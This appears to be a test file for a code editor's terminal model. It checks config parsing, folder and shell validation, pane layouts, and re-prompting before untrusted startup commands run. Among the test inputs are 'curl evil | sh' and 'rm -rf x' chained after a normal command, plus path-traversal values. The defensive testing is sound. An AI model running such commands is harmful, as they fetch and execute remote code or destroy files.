import test from "node:test";
import assert from "node:assert/strict";

const model = () => import("../.test-build/terminal/terminal-model.js");
let counter = 0;
const ids = () => `gen${++counter}`;

test("the terminals of a config are read defensively: bad entries go, bad fields get defaults, ids stay unique", async () => {
  const m = await model();
  const setups = m.terminalsOfConfig({
    terminals: [
      { id: "a", name: "  Server  \n logs ", shell: "pwsh", cwd: "src\\api/", startup: "npm run dev\r\n" },
      "not an object",
      { id: "a", name: "Duplicate id", shell: "../../evil", cwd: "../outside", startup: 7 },
      { id: "bad id!", name: "x".repeat(200), cwd: "/etc", shell: "C:\\Windows\\cmd.exe" },
      null,
    ],
  }, ids);
  assert.equal(setups.length, 3);
  assert.deepEqual(setups[0], { id: "a", name: "Server logs", shell: "pwsh", cwd: "src/api", startup: "npm run dev\n" });
  assert.notEqual(setups[1].id, "a", "a repeated id is replaced");
  assert.equal(setups[1].shell, "", "a shell that is not a plain id is dropped: a project file never names a program");
  assert.equal(setups[1].cwd, "", "a folder that leaves the project is dropped");
  assert.equal(setups[1].startup, "");
  assert.ok(setups[2].name.length <= m.MAX_TERMINAL_NAME);
  assert.equal(setups[2].cwd, "", "an absolute folder is dropped");
  assert.equal(setups[2].shell, "", "and so is a path used as a shell");
  assert.equal(m.terminalsOfConfig({ terminals: "nope" }).length, 0);
  assert.equal(m.terminalsOfConfig({ terminals: Array.from({ length: 100 }, (_, i) => ({ id: `t${i}` })) }).length, m.MAX_TERMINALS);
});

test("writing the terminals keeps the other parts of the config and removes the keys when none are left", async () => {
  const m = await model();
  const setups = [{ id: "a", name: "One", shell: "pwsh", cwd: "", startup: "" }, { id: "b", name: "Two", shell: "cmd", cwd: "x/y", startup: "make" }];
  const config = m.withTerminals({ other: { keep: true } }, setups, "b");
  assert.deepEqual(config.other, { keep: true });
  assert.equal(config.activeTerminal, "b");
  assert.deepEqual(config.terminals, [{ id: "a", name: "One", shell: "pwsh", cwd: "" }, { id: "b", name: "Two", shell: "cmd", cwd: "x/y", startup: "make" }]);
  const back = m.terminalsOfConfig(JSON.parse(m.serializeProjectConfig(config)));
  assert.deepEqual(back, setups);
  assert.equal(m.activeTerminalOfConfig(config, back), "b");
  assert.equal(m.activeTerminalOfConfig({ activeTerminal: "zzz" }, back), null);
  const emptied = m.withTerminals(config, [], null);
  assert.equal("terminals" in emptied, false);
  assert.equal("activeTerminal" in emptied, false);
  assert.equal(m.isEmptyProjectConfig(m.withTerminals({}, [], null)), true);
  assert.equal(m.isEmptyProjectConfig(emptied), false, "another part of the file is still there");
});

test("a config that is not a JSON object is not a config, so it is never overwritten", async () => {
  const m = await model();
  assert.deepEqual(m.parseProjectConfig(""), {});
  assert.deepEqual(m.parseProjectConfig(null), {});
  assert.equal(m.parseProjectConfig("[1,2]"), null);
  assert.equal(m.parseProjectConfig("{ broken"), null);
  assert.deepEqual(m.parseProjectConfig('{"a":1}'), { a: 1 });
});

test("names are unique without regard to case, and cleaned", async () => {
  const m = await model();
  assert.equal(m.uniqueName("PowerShell", []), "PowerShell");
  assert.equal(m.uniqueName("PowerShell", ["powershell"]), "PowerShell (2)");
  assert.equal(m.uniqueName("PowerShell", ["PowerShell", "PowerShell (2)"]), "PowerShell (3)");
  assert.equal(m.uniqueName("   ", []), "Terminal");
  assert.equal(m.cleanName("  a   b \n c "), "a b c");
});

test("folders: relative to the project, never outside it, and written with the root's separators", async () => {
  const m = await model();
  assert.equal(m.relativeFolder("D:\\Repos\\app", "D:\\Repos\\app\\src-tauri"), "src-tauri");
  assert.equal(m.relativeFolder("D:/Repos/app/", "d:/repos/APP"), "");
  assert.equal(m.relativeFolder("D:\\Repos\\app", "D:\\Repos\\app-other"), null, "a sibling that starts with the same letters is not inside");
  assert.equal(m.absoluteFolder("D:\\Repos\\app", "src/api"), "D:\\Repos\\app\\src\\api");
  assert.equal(m.absoluteFolder("/home/u/app/", "src"), "/home/u/app/src");
  assert.equal(m.absoluteFolder("/home/u/app", ""), "/home/u/app");
  assert.equal(m.cleanRelativeFolder("./a//b/"), "a/b");
  assert.equal(m.cleanRelativeFolder("a/../b"), null);
  assert.equal(m.cleanRelativeFolder("C:\\x"), null);
});

test("a shell is found by id, else the default, else the first", async () => {
  const m = await model();
  const profiles = [{ id: "cmd", label: "cmd", path: "c", args: [] }, { id: "pwsh", label: "PowerShell", path: "p", args: [] }];
  assert.equal(m.pickProfile(profiles, "cmd", "pwsh").id, "cmd");
  assert.equal(m.pickProfile(profiles, "gone", "pwsh").id, "pwsh");
  assert.equal(m.pickProfile(profiles, "gone", null).id, "cmd");
  assert.equal(m.pickProfile([], "x", null), null);
});

test("startup commands are what the user is asked to trust, one by one", async () => {
  const m = await model();
  const a = [{ id: "1", name: "A", shell: "", cwd: "", startup: "npm run dev" }, { id: "2", name: "B", shell: "", cwd: "", startup: "" }, { id: "3", name: "C", shell: "", cwd: "", startup: " make \n" }];
  assert.deepEqual(m.startupCommands(a), [{ name: "A", command: "npm run dev" }, { name: "C", command: "make" }]);
  assert.equal(m.commandHash("make"), m.commandHash("  make \n"), "white space around a command is not a change");
  assert.notEqual(m.commandHash("npm run dev"), m.commandHash("npm run dev && rm -rf x"));
  assert.deepEqual(m.untrustedCommands(a, new Set()).map(item => item.name), ["A", "C"]);
  assert.deepEqual(m.untrustedCommands(a, new Set([m.commandHash("npm run dev")])).map(item => item.name), ["C"]);
  const changed = [{ ...a[0], startup: "npm run dev && curl evil | sh" }];
  assert.equal(m.untrustedCommands(changed, new Set([m.commandHash("npm run dev")])).length, 1, "a command that changed is asked about again");
});

test("the user's own shells are accepted only with an absolute program path", async () => {
  const m = await model();
  const raw = JSON.stringify([
    { id: "custom-a", label: "Nushell", path: "C:\\tools\\nu.exe", args: ["-l", 5] },
    { label: "relative", path: "nu.exe" },
    { label: "unix", path: "/usr/bin/fish", args: [] },
    { label: 3, path: "/x" },
    { id: "evil", label: "Bad id", path: "/bin/sh" },
  ]);
  const profiles = m.parseCustomProfiles(raw);
  assert.deepEqual(profiles.map(p => p.label), ["Nushell", "unix", "Bad id"]);
  assert.deepEqual(profiles[0].args, ["-l"]);
  assert.ok(profiles.every(p => p.id.startsWith("custom-") && p.custom === true));
  assert.deepEqual(m.parseCustomProfiles("not json"), []);
  assert.deepEqual(m.splitArguments('-NoLogo -Command "echo hi there" x'), ["-NoLogo", "-Command", "echo hi there", "x"]);
  assert.equal(m.joinArguments(["-a", "b c"]), '-a "b c"');
});

test("terminal ids are plain keys", async () => {
  const m = await model();
  const id = m.newTerminalId(() => 0.5, () => 1_700_000_000_000);
  assert.match(id, /^[A-Za-z0-9_-]{1,64}$/);
  assert.notEqual(m.newTerminalId(() => 0.1), m.newTerminalId(() => 0.9));
});

const P = id => ({ kind: "pane", id });
const S = (dir, ...children) => ({ kind: "split", dir, children });

test("splitting puts the new terminal next to the one in focus, and a different direction makes a split of its own", async () => {
  const m = await model();
  const one = m.splitLayout(P("a"), "a", "b", "columns");
  assert.deepEqual(one, S("columns", P("a"), P("b")));
  assert.deepEqual(m.splitLayout(one, "b", "c", "columns"), S("columns", P("a"), P("b"), P("c")), "the same direction joins the same split");
  assert.deepEqual(m.splitLayout(one, "b", "c", "rows"), S("columns", P("a"), S("rows", P("b"), P("c"))), "split right and then down: the focused terminal is split in two, one above the other");
  assert.deepEqual(m.splitLayout(one, "a", "c", "rows"), S("columns", S("rows", P("a"), P("c")), P("b")));
  assert.deepEqual(m.leaves(m.splitLayout(one, "b", "c", "rows")), ["a", "b", "c"]);
  assert.deepEqual(m.splitLayout(P("a"), "a", "b", "rows"), S("rows", P("a"), P("b")), "from one terminal either direction can be chosen");
});

test("removing a terminal collapses what is left", async () => {
  const m = await model();
  const layout = S("columns", P("a"), S("rows", P("b"), P("c")));
  assert.deepEqual(m.removeLeaf(layout, "c"), S("columns", P("a"), P("b")), "a split with one part is that part");
  assert.deepEqual(m.removeLeaf(layout, "a"), S("rows", P("b"), P("c")));
  assert.equal(m.removeLeaf(P("a"), "a"), null);
  assert.deepEqual(m.removeLeaf(S("rows", P("a"), S("rows", P("b"), P("c"))), "a"), S("rows", P("b"), P("c")));
  assert.deepEqual(m.replaceLeaf(layout, "b", "z"), S("columns", P("a"), S("rows", P("z"), P("c"))));
});

test("a layout is made drawable: existing terminals only, once each, the active one among them, never empty", async () => {
  const m = await model();
  const ids = ["a", "b", "c", "d", "e"];
  assert.deepEqual(m.normalizeLayout(S("columns", P("a"), P("b")), ids, "b"), S("columns", P("a"), P("b")));
  assert.deepEqual(m.normalizeLayout(S("columns", P("a"), P("gone"), P("a")), ["a", "b"], "a"), P("a"), "a closed terminal and a repeated one are dropped");
  assert.deepEqual(m.normalizeLayout(P("a"), ["a", "b"], "b"), S("columns", P("a"), P("b")), "the active terminal is added");
  assert.deepEqual(m.leaves(m.normalizeLayout(S("columns", P("a"), P("b"), P("c"), P("d")), ids, "e")), ["a", "b", "c", "e"], "with no room it replaces the last one");
  assert.deepEqual(m.normalizeLayout(null, ["a", "b"], null), P("a"), "there is always one when a terminal exists");
  assert.equal(m.normalizeLayout(P("a"), [], null), null);
  assert.equal(m.leaves(m.normalizeLayout(S("columns", ...ids.concat("f", "g").map(P)), ids.concat("f", "g"), "a")).length, m.MAX_PANES);
});

test("a stored layout is read back only when it is valid", async () => {
  const m = await model();
  const layout = S("columns", P("a"), S("rows", P("b"), P("c")));
  assert.deepEqual(m.parseLayout(JSON.stringify(layout)), layout);
  assert.equal(m.parseLayout("nonsense"), null);
  assert.equal(m.parseLayout(JSON.stringify({ kind: "split", dir: "diagonal", children: [] })), null);
  assert.deepEqual(m.parseLayout(JSON.stringify(S("columns", P("a"), P("bad id")))), P("a"), "an invalid part is dropped and a split of one is that one");
  assert.equal(m.parseLayout(null), null);
});

test("a terminal dropped on a side of another one goes before or after it, in the direction of that side", async () => {
  const m = await model();
  const P = id => ({ kind: "pane", id });
  const S = (dir, ...children) => ({ kind: "split", dir, children });
  assert.deepEqual(m.placeBeside(S("columns", P("a"), P("b")), "b", "c", "right"), S("columns", P("a"), P("b"), P("c")), "the same direction joins the split");
  assert.deepEqual(m.placeBeside(S("columns", P("a"), P("b")), "a", "c", "left"), S("columns", P("c"), P("a"), P("b")), "left of the first");
  assert.deepEqual(m.placeBeside(S("columns", P("a"), P("b")), "b", "c", "bottom"), S("columns", P("a"), S("rows", P("b"), P("c"))), "another direction splits the target");
  assert.deepEqual(m.placeBeside(P("a"), "a", "c", "top"), S("rows", P("c"), P("a")));
  assert.deepEqual(m.placeBeside(S("columns", P("a"), P("b"), P("c")), "a", "c", "bottom"), S("columns", S("rows", P("a"), P("c")), P("b")), "a terminal that was shown is moved, not copied");
  assert.deepEqual(m.placeBeside(S("columns", P("a"), P("b")), "a", "b", "right"), S("columns", P("a"), P("b")), "right of a: where b already is");
  assert.deepEqual(m.placeBeside(P("a"), "a", "a", "left"), P("a"), "onto itself nothing happens");
  assert.deepEqual(m.leaves(m.placeBeside(S("columns", P("a"), P("b")), "b", "c", "top")), ["a", "c", "b"]);
});

test("two terminals can exchange places, and a tab can be moved in the list", async () => {
  const m = await model();
  const P = id => ({ kind: "pane", id });
  const S = (dir, ...children) => ({ kind: "split", dir, children });
  assert.deepEqual(m.swapLeaves(S("columns", P("a"), S("rows", P("b"), P("c"))), "a", "c"), S("columns", P("c"), S("rows", P("b"), P("a"))));
  assert.deepEqual(m.swapLeaves(S("columns", P("a"), P("b")), "a", "z"), S("columns", P("z"), P("b")), "a terminal that is not shown takes the place");
  assert.deepEqual(m.moveId(["a", "b", "c", "d"], "d", 0), ["d", "a", "b", "c"]);
  assert.deepEqual(m.moveId(["a", "b", "c", "d"], "a", 2), ["b", "c", "a", "d"]);
  assert.deepEqual(m.moveId(["a", "b"], "b", 99), ["a", "b"]);
  assert.deepEqual(m.moveId(["a", "b"], "nope", 0), ["a", "b"]);
});

test("a code block is matched with the shells that can run it", async () => {
  const m = await model();
  assert.equal(m.languageFamily("bash"), "posix"); assert.equal(m.languageFamily(" Shell "), "posix");
  assert.equal(m.languageFamily("PowerShell"), "powershell"); assert.equal(m.languageFamily("ps1"), "powershell");
  assert.equal(m.languageFamily("bat"), "cmd");
  for (const other of ["js", "python", "", "console", "json"]) assert.equal(m.languageFamily(other), null, `"${other}" is not a shell script`);
  assert.equal(m.shellFamily("gitbash"), "posix"); assert.equal(m.shellFamily("wsl"), "posix");
  assert.equal(m.shellFamily("pwsh"), "powershell"); assert.equal(m.shellFamily("cmd"), "cmd");
  assert.equal(m.shellFamily("custom-nu"), null);
  const profiles = ["cmd", "powershell", "wsl", "gitbash"].map(id => ({ id, label: id, path: "x", args: [] }));
  assert.equal(m.pickShellFor("posix", profiles).id, "gitbash", "Git Bash before WSL");
  assert.equal(m.pickShellFor("powershell", profiles).id, "powershell");
  assert.equal(m.pickShellFor("cmd", profiles).id, "cmd");
  assert.equal(m.pickShellFor("posix", profiles.slice(0, 2)), null, "no bash on this computer");
});

test("the text typed for a code block is cleaned up and ends each line with Enter", async () => {
  const m = await model();
  const CR = String.fromCharCode(13);
  assert.equal(m.commandText("cd /mnt/c/x\n"), "cd /mnt/c/x");
  assert.equal(m.commandText("\n\nnpm install\n  npm test  \n\n"), "npm install" + CR + "  npm test");
  assert.equal(m.commandText("$ ls\n$ pwd"), "ls" + CR + "pwd", "prompt marks of documentation are dropped when every line has one");
  assert.equal(m.commandText("echo $HOME\n$ x"), "echo $HOME" + CR + "$ x", "but not when only some lines have one");
  assert.equal(m.commandText("a\r\nb"), "a" + CR + "b");
  assert.equal(m.commandText("   \n\n"), "");
});
